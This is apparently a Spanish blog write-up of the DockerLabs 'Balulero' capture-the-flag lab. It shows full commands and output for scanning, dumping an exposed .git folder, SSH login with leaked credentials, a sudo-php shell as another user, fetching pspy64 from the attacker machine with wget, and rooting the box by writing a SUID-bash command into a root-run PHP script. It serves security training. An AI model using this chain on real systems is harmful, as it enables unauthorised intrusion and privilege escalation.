---
title: DockerLabs - Balulero
summary: "Write-up del laboratorio Balulero de DockerLabs"
author: elcybercurioso
date: 2025-11-11 21:20:05
categories: [Post, DockerLabs]
tags: [fácil, brute force, git, credentials leaking, sudo, file permissions]
media_subpath: "/assets/img/posts/dockerlabs_balulero"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero]
└─$ nmap -sCV -p22,80 172.17.0.2                                  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fb:64:7a:a5:1f:d3:f2:73:9c:8d:54:8b:65:67:3b:11 (RSA)
|   256 47:e1:c1:f2:de:f5:80:0e:10:96:04:95:c2:80:8b:76 (ECDSA)
|_  256 b1:c6:a8:5e:40:e0:ef:92:b2:e8:6f:f3:ad:9e:41:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mi Landing Page - Ciberseguridad
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

## análisis

En la página principal encontramos varias funcionalidades, pero nada destacable:

![Desktop View](/20251110191212.webp){: width="972" height="589" .shadow}

Revisando los recursos del sistema con `gobuster`, encontramos el recurso `/whoami`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 9487]
/server-status        (Status: 403) [Size: 275]
/whoami               (Status: 301) [Size: 309] [--> http://172.17.0.2/whoami/]
Progress: 882228 / 882228 (100.00%)
===============================================================balú
Finished
===============================================================
```

Al acceder, resulta que nos permite listar su contenido, pero no vemos a primera vista ningún fichero o carpeta:

![Desktop View](/20251110191924.webp){: width="600" height="370" .shadow}

Sin embargo, revisamos nuevamente con `gobuster` en busca de posibles ficheros existentes, incluidos ficheros ocultos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero]
└─$ gobuster dir -u "http://172.17.0.2/whoami/" -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 200 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/whoami/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.env                 (Status: 403) [Size: 275]
/.git/HEAD            (Status: 200) [Size: 21]
/.git/config          (Status: 200) [Size: 291]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.git                 (Status: 301) [Size: 314] [--> http://172.17.0.2/whoami/.git/]
/.git/logs/           (Status: 200) [Size: 1150]
/.git/index           (Status: 200) [Size: 1298]
/.hta                 (Status: 403) [Size: 275]
Progress: 4746 / 4746 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos que la carpeta contiene un directorio `.git`:

![Desktop View](/20251110194720.webp){: width="600" height="370" .shadow}

Cuando se nos presenta la posibilidad de revisar un directorio `.git`, herramientas como [git-dumper](https://github.com/arthaud/git-dumper) nos ayudarán a obtener todo su contenido, y poder revisarlo en nuestra máquina.    

Procedemos a configurar `git-dumper`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero]
└─$ git clone https://github.com/arthaud/git-dumper          
Cloning into 'git-dumper'...
remote: Enumerating objects: 204, done.
remote: Counting objects: 100% (104/104), done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 204 (delta 69), reused 60 (delta 57), pack-reused 100 (from 2)
Receiving objects: 100% (204/204), 67.13 KiB | 1.03 MiB/s, done.
Resolving deltas: 100% (106/106), done.
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero]
└─$ cd git-dumper
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero/git-dumper]
└─$ python3 -m venv venv 
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero/git-dumper]
└─$ source venv/bin/activate
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero/git-dumper]
└─$ pip3 install -r requirements.txt
```

Ejecutamos el script `git_dumper.py`, y guardamos el contenido en la carpeta `dump`:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero/git-dumper]
└─$ python3 git_dumper.py http://172.17.0.2/whoami/.git dump
[-] Testing http://172.17.0.2/whoami/.git/HEAD [200]
[-] Testing http://172.17.0.2/whoami/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://172.17.0.2/whoami/.gitignore [404]
[-] http://172.17.0.2/whoami/.gitignore responded with status code 404
[-] Fetching http://172.17.0.2/whoami/.git/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/description [200]
[-] Fetching http://172.17.0.2/whoami/.git/packed-refs [200]
[-] Fetching http://172.17.0.2/whoami/.git/HEAD [200]
[-] Fetching http://172.17.0.2/whoami/.git/config [200]
[-] Fetching http://172.17.0.2/whoami/.git/index [200]
[-] Fetching http://172.17.0.2/whoami/.git/objects/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/info/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/branches/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/logs/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/objects/info/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/objects/pack/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/info/exclude [200]
[-] Fetching http://172.17.0.2/whoami/.git/logs/HEAD [200]
[-] Fetching http://172.17.0.2/whoami/.git/objects/pack/pack-1c4bd6f624c787d4707dd3f56b85e7b6e85fd9ed.idx [200]
[-] Fetching http://172.17.0.2/whoami/.git/logs/refs/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/objects/pack/pack-1c4bd6f624c787d4707dd3f56b85e7b6e85fd9ed.pack [200]
[-] Fetching http://172.17.0.2/whoami/.git/objects/pack/pack-1c4bd6f624c787d4707dd3f56b85e7b6e85fd9ed.rev [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/commit-msg.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/post-update.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/pre-push.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/pre-receive.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/pre-commit.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/update.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/sendemail-validate.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://172.17.0.2/whoami/.git/logs/refs/heads/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/logs/refs/remotes/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/logs/refs/heads/main [200]
[-] Fetching http://172.17.0.2/whoami/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/logs/refs/remotes/origin/HEAD [200]
[-] Fetching http://172.17.0.2/whoami/.git/refs/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/refs/heads/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/refs/tags/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/refs/remotes/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/refs/heads/main [200]
[-] Fetching http://172.17.0.2/whoami/.git/refs/remotes/origin/ [200]
[-] Fetching http://172.17.0.2/whoami/.git/refs/remotes/origin/HEAD [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 16 paths from the index
```

Nos metemos en la carpeta `dump`, y revisamos los commits realizados:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/…/Balulero/git-dumper/dump/.git]
└─$ git log                                          
commit **************************************** (HEAD -> main, origin/main, origin/HEAD)
Author: Mario <marioalvarezfdz@gmail.com>
Date:   Fri Sep 27 15:05:44 2024 +0200

    Update index.html

commit ****************************************
Author: Mario <marioalvarezfdz@gmail.com>
Date:   Fri Sep 27 15:04:30 2024 +0200

    Update styles.css

commit ****************************************
Author: Mario <marioalvarezfdz@gmail.com>
Date:   Fri Sep 27 14:36:41 2024 +0200

    Add files via upload
```

Sin embargo, no encontramos nada que nos ayude a continuar.

Por ello, volvemos a la página principal de la máquina, y en la consola encontramos un mensaje que indica la existencia de un recurso con unas credenciales:

![Desktop View](/20251110195458.webp){: width="972" height="589" .shadow}

Al acceder, encontramos las credenciales que mencionaban:

![Desktop View](/20251110195622.webp){: width="600" height="370" .shadow}

Probamos dichas credenciales por SSH, y vemos que son correctas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero]
└─$ ssh balu@172.17.0.2                                                                  
balu@172.17.0.2`s password: 
balu@965856aa6ccd:~$ whoami
balu
balu@965856aa6ccd:~$ hostname -I
172.17.0.2
```

De esta manera, habremos obtenido acceso a la máquina como el usuario `balu`.

## movimiento lateral (chocolate)

Revisamos los permisos SUDO del usuario `balu`, los cuales nos permiten ejecutar `/usr/bin/php` como el usuario `chocolate`:

```bash
balu@965856aa6ccd:~$ sudo -l
Matching Defaults entries for balu on 965856aa6ccd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User balu may run the following commands on 965856aa6ccd:
    (chocolate) NOPASSWD: /usr/bin/php
```

 En [GTFOBins](https://gtfobins.github.io/gtfobins/php/#sudo) nos indican que cuando tengamos permisos SUDO sobre el binario PHP, podemos llegar en invocar una consola como otro usuario empleando el siguiente comando:

![Desktop View](/20251110195923.webp){: width="972" height="589" .shadow}

Ejecutamos el comando que nos indican (indicando el parámetro `-u chocolate`, ya que de lo contrario, estaríamos intentando ejecutar el comando con los permisos del usuario `root`), y vemos que logramos invocar una consola como el usuario `chocolate`:

```bash
balu@965856aa6ccd:~$ sudo -u chocolate php -r "system('/bin/bash');"
chocolate@965856aa6ccd:/home/balu$ whoami
chocolate
```

## escalada de privilegios (root)

Una vez que hayamos obtenido el acceso a la máquina como el usuario `chocolate`, procedemos a enviar el binario `pspy64` a la máquina víctima, ya que vamos a revisar que procesos se están ejecutando a nivel de sistema:

```bash
┌──(venv)─(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Balulero]
└─$ python3 -m http.server 80                               
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Con `wget` recibimos el binario en la máquina víctima:

```bash
chocolate@965856aa6ccd:~$ wget http://172.17.0.1/pspy64
Connecting to 172.17.0.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                           100%[========================================================================================================>]   2.96M  --.-KB/s    in 0.05s   
```

Le damos permisos de ejecución, y lo ejecutamos:

```bash
chocolate@965856aa6ccd:~$ chmod +x pspy64
chocolate@965856aa6ccd:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

CMD: UID=0     PID=49     | sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups 
CMD: UID=0     PID=25     | /usr/sbin/apache2 -k start 
CMD: UID=0     PID=1      | /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done 
CMD: UID=0     PID=5061   | /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done 
CMD: UID=0     PID=5063   | /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done 
CMD: UID=0     PID=5064   | php /opt/script.php 
CMD: UID=0     PID=5065   | /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done 
CMD: UID=0     PID=5066   | /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done 
CMD: UID=0     PID=5067   | /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done 
CMD: UID=0     PID=5068   | php /opt/script.php 
CMD: UID=0     PID=5070   | /bin/sh -c service apache2 start && a2ensite 000-default.conf && service ssh start && while true; do php /opt/script.php; sleep 5; done 
```

Pasado un tiempo, encontramos que hay un script que se está ejecutando, por lo que revisamos cuales son sus permisos:

```bash
chocolate@965856aa6ccd:~$ ls -la /opt/script.php
-rw-r--r-- 1 chocolate chocolate 40 Nov 10 19:15 /opt/script.php
```

Viendo que el propietario de dicho script es el propio `chocolate`, podemos modificarlo para ejecutar una instrucción que nosotros indiquemos, la cual, en este caso, se encargará de modificar los permisos del binario `/bin/bash`:

```bash
chocolate@965856aa6ccd:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Modificamos el script con la instrucción que cambiará los permisos del binario `/bin/bash` a SUID:

```bash
chocolate@965856aa6ccd:~$ echo "<?php system('chmod u+s /bin/bash'); ?>" > /opt/script.php
chocolate@965856aa6ccd:~$ cat /opt/script.php
<?php system('chmod u+s /bin/bash'); ?>
```

Tras un tiempo, volvemos a revisar los permisos del binario `/bin/bash`, y vemos que ahora es SUID:

```bash
chocolate@965856aa6ccd:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

De esta manera, ahora podremos a invocar una consola como el usuario `root`:

```bash
chocolate@965856aa6ccd:~$ bash -p
bash-5.0# whoami
root
```

Y así, habremos completado el laboratorio **Balulero**!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>